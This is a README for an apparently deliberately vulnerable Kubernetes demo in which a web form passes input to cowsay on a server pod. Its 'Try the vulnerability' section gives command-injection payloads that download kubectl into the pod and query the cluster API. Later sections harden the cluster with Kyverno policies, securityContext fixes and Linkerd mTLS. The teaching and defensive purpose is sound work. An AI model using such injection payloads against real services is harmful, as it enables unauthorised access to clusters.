<div align="center">
  <img src="https://github.com/GridexX/vulnerable-web-stack-kube/assets/50552672/990b9e90-7446-4c4f-b9ad-4fe1225d21fd" width="300">
  <h1>
    Vulnerable Web Stack Kube
  </h1>
  <h4>How missconfigured services inside Kubernetes can lead to privilegies escalation</h4>
  <p align="center">
    <a href="https://github.com/GridexX/vulnerable-web-stack-kube"><img src="https://img.shields.io/github/stars/GridexX/vulnerable-web-stack-kube.svg?style=flat" alt="stars"></a>
    <a href="https://github.com/GridexX/vulnerable-web-stack-kube"><img src="https://img.shields.io/github/license/GridexX/vulnerable-web-stack-kube.svg?style=flat" alt="license"></a>
  </p>
</div>



There are two services in this repository, a client and a server. The client is a simple web application that send a message to the server. The server is a simple web application that receive a message and display it in the console with the cowsay command.

## How to use it ❓

```bash
cd vulnerable-web-stack-kube
kubectl apply -f ./k8s/resources
# Port-forward the client and server application
kubectl port-forward client-deployment-ip-service 8080:80
kubectl port-forward server-deployment-ip-service 3000:8000
```

### Try the vulnerability 🥷

Open your browser and go to [http://localhost:8080](http://localhost:8080). You will see a form with a text area. Write a message and click on the send button. You will see the message displayed in the console of the server pod.

Copy and paste the following text into the text area:

```bash
hello; curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl; chmod +x ./kubectl
```

This will download kubectl inside the pod and give us the possibility to execute command inside the pod

```bash
hello; ./kubectl get pods
```

We can see that the command is executed inside the pod and that we can reach the kube API

### Protect the cluster with kyverno 🏰

To protect the cluster we will use kyverno. Kyverno is a policy engine for Kubernetes. It allows us to define policies that will be applied to the cluster.
We will also display the policy violations in a grafana dashboard.
To do so, we will deploy the kube-prometheus-stack chart and kyverno with Helm:

```bash
# Install the Helm repository
cd ./vulnerable-web-stack-kube
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helrm repo update
helm install kyverno kyverno/kyverno -f k8s/values/kyverno-values.yaml -n kyverno --create-namespace
helm install prom-stack prometheus-community/kube-prometheus-stack -f k8s/values/prom-stack-values.yaml
# Port-forward the grafana dashboard
kubectl port-forward -n prom-stack-grafana-uuid 3001:3000

# Fix the policy violation
# Remove the resources
kubectl delete -f ./k8s/resources
# Apply the policies
kubectl apply -f ./k8s/policies
```

Now if we re-deploy the resources, we will se that the server pod is not created.

To fix the policy violation, we added `securityContext` fields in the deployment manifest of the server.
With this fixed manifest, the server pod will be created. Apply the fixed manifest with:

```yaml
# Reapply the fixed resources policies
kubectl apply -f ./k8s/resources_fixed
```

Restart the port-forwarding of the server pod and try again the vulnerability. You will see that the command is not executed inside the pod :cwhite_check_mark:

#### See the policy violations in the grafana dashboard 📊

Go to [http://localhost:3001](http://localhost:3001) and login with the default credentials (admin:prom-operator).
You will see the dashboard with the policy violations.

### Sign and build the docker images ✍️

This step describes how to build and sign the docker images.

1. The server

    ```bash
    cd ./services/server
    docker build -t <your-docker-hub-username>/vulnerable-web-stack-kube-server:latest .
    docker trust sign <your-docker-hub-username>/vulnerable-web-stack-kube-server:latest
    ```

2. The client

    ```bash
    cd ./services/client
    docker build -t <your-docker-hub-username>/vulnerable-web-stack-kube-client:latest .
    docker trust sign <your-docker-hub-username>/vulnerable-web-stack-kube-client:latest
    ```

### Add a service Mesh and mTLS communication between services

> [!NOTE]
> This step is optional and requires a service mesh like Linkerd. To do so, you first need to install the Linkerd CLI and the Linkerd control plane.

1. Install the Linkerd CLI

    ```bash
    curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh
    export PATH=$PATH:$HOME/.linkerd2/bin
    ```

2. Install the Linkerd control plane

    To check that check and validate that everything is configured and your cluster is ready to install Linkerd, run:

    ```bash
    linkerd check --pre
    ```

    If there are any checks that do not pass, make sure to follow the provided links and fix those issues before proceeding.

    Now Install the Linkerd control plane by running:

    ```bash
        linkerd install | kubectl apply -f -
    ```

3. Install Linkerd onto your cluster

    Now that you have the CLI running locally and a cluster that is ready to go, it’s time to install Linkerd on your Kubernetes cluster. To do this, run:

    ```bash
    linkerd install --crds | kubectl apply -f -
    linkerd install | kubectl apply -f -
    ```

    Wait for the control plane to be ready (and verify your installation) by running:

    ```bash
    linkerd check
    ```

4. Add mTLS communication between the services

    Ensure, the Server and Client services are running in the `default` namespace. We will now install the Linkerd service mesh and add mTLS communication between the services.

    ```bash
    kubectl get deploy -o yaml \
    | linkerd inject - \
    | kubectl apply -f -
    ```

    This command retrieves all of the deployments running, runs their manifests through linkerd inject, and then reapplies it to the cluster. This will add the Linkerd proxy to each of the deployments, and enable mTLS communication between the services.

    > [!NOTE]
    > Congratulations! You have now installed Linkerd and added mTLS communication between the services.

5. Explore the Linkerd dashboard (optional)

    We’ve added Linkerd to Cowsay, but there are no visible changes to the application!

    Let’s take a closer look at what Linkerd is actually doing. To do this, let’s install the viz extension, which will install an on-cluster metric stack and dashboard.To install the viz extension, run:

    ```bash
    linkerd viz install | kubectl apply -f - # install the on-cluster metrics stack
    ```

    Once you’ve installed the extension, let’s validate everything one last time:

    ```bash
    linkerd check
    ```

    With the control plane and extensions installed and running, we’re now ready to explore Linkerd! Access the dashboard with:

    ```bash
    linkerd viz dashboard &
    ```

    This command will open the Linkerd dashboard in your default web browser.

## Clean the cluster 🗑️

```bash
kubectl delete -f ./k8s/policies
kubectl delete -f ./k8s/resources
```

### Licence

This project is licensed under the MIT License - see the LICENSE file for details. 

### Author 👨‍💻

Developped in the ☁️ with 🔒 by [GridexX](https://github.com/GridexX)
